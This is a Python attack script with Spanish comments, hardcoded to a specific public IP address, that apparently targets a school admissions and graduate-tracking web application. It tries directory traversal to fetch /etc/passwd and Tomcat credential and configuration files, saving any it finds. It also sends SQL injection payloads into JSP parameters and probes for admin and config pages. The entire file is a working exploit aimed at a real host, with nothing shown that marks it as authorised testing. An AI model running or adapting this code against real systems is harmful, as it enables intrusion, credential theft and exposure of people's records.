import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class JSPPathExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def deep_directory_traversal(self):
        """Directory traversal usando las rutas JSP encontradas"""
        print("[*] Directory traversal mediante rutas JSP...")
        
        base_paths = [
            "/jsp/escolar/proceso_admision/",
            "/jsp/escolar/proceso_admision_lic/", 
            "/jsp/seguimiento_egreso/",
            "/jsp/"
        ]
        
        critical_files = [
            "../../../../../../etc/passwd",
            "../../../../../../windows/win.ini",
            "../../../../../../conf/tomcat-users.xml",
            "../../../../../../webapps/ROOT/WEB-INF/web.xml",
            "../../../../../../webapps/sito/WEB-INF/web.xml",
            "../../../../../../webapps/misitio/WEB-INF/web.xml"
        ]
        
        for base_path in base_paths:
            for critical_file in critical_files:
                test_path = f"{base_path}../../../../../../{critical_file}"
                try:
                    url = f"{self.base_url}{test_path}"
                    response = self.session.get(url, timeout=8)
                    
                    if "root:" in response.text:
                        print(f"[!] ¡/etc/passwd encontrado! {test_path}")
                        self.save_file("etc_passwd.txt", response.text)
                    elif "tomcat-users" in response.text:
                        print(f"[!] ¡tomcat-users.xml encontrado! {test_path}")
                        self.save_file("tomcat_users.xml", response.text)
                    elif response.status_code == 200:
                        print(f"[+] Respuesta 200: {test_path}")
                        
                except Exception as e:
                    pass

    def test_parameter_injection(self):
        """Inyección en parámetros de las JSP"""
        print("\n[*] Probando inyección en parámetros JSP...")
        
        test_cases = [
            {
                "url": "/jsp/escolar/proceso_admision/proceso_interesado.jsp",
                "params": {"xModalidadP": "N' OR '1'='1"}
            },
            {
                "url": "/jsp/seguimiento_egreso/proceso_registro_egresado.jsp", 
                "params": {"xNuevo": "1 UNION SELECT 1,2,3"}
            }
        ]
        
        for test_case in test_cases:
            try:
                url = f"{self.base_url}{test_case['url']}"
                response = self.session.get(url, params=test_case['params'], timeout=5)
                
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    print(f"[!] Posible SQL injection en {test_case['url']}")
                elif response.status_code == 200:
                    print(f"[+] Parámetros aceptados en {test_case['url']}")
                    
            except Exception as e:
                print(f"[-] Error en {test_case['url']}: {e}")

    def discover_more_jsp_files(self):
        """Descubre más archivos JSP"""
        print("\n[*] Descubriendo archivos JSP adicionales...")
        
        common_jsp_files = [
            "/jsp/login.jsp", "/jsp/index.jsp", "/jsp/admin.jsp", "/jsp/user.jsp",
            "/jsp/error.jsp", "/jsp/config.jsp", "/jsp/database.jsp",
            "/jsp/upload.jsp", "/jsp/download.jsp", "/jsp/report.jsp",
            "/WEB-INF/web.xml", "/META-INF/context.xml",
            "/jsp/escolar/index.jsp", "/jsp/escolar/admin.jsp",
            "/jsp/seguimiento_egreso/index.jsp", "/jsp/seguimiento_egreso/admin.jsp"
        ]
        
        for jsp_file in common_jsp_files:
            try:
                url = f"{self.base_url}{jsp_file}"
                response = self.session.get(url, timeout=3)
                
                if response.status_code == 200:
                    print(f"[+] JSP encontrado: {jsp_file}")
                elif response.status_code == 403:
                    print(f"[!] Acceso prohibido: {jsp_file}")
                elif response.status_code == 302:
                    print(f"[+] Redirección: {jsp_file}")
                    
            except:
                pass

    def save_file(self, filename, content):
        """Guarda archivos"""
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            print(f"[+] Archivo guardado: {filename}")
        except:
            pass

# Ejecutar análisis JSP
jsp_exploiter = JSPPathExploiter("189.254.143.102")
jsp_exploiter.deep_directory_traversal()
jsp_exploiter.test_parameter_injection()
jsp_exploiter.discover_more_jsp_files()